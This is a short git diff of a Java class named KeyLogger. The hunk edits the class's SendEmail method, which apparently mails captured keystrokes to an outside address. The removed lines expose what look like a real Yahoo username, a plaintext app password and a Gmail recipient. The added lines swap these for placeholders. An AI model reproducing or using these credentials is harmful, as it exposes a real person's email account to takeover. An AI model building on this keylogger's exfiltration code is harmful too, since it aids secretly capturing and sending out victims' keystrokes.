@@ -130,10 +130,10 @@ public class KeyLogger implements NativeKeyListener {
 	public static void SendEmail() throws IOException {
 
 		//authentication info
-				final String username="deepaksntiwari@yahoo.com";
-				final String password="qbqzqshynjgjcccz";
-				String fromEmail="deepaksntiwari@yahoo.com";
-				String toEmail="dkt151999@gmail.com";
+				final String username="fromEmail@yahoo.com";
+				final String password="**************";
+				String fromEmail="fromEmail@yahoo.com";
+				String toEmail="toEmail@gmail.com";
 				
 				
 				Properties properties = new Properties();
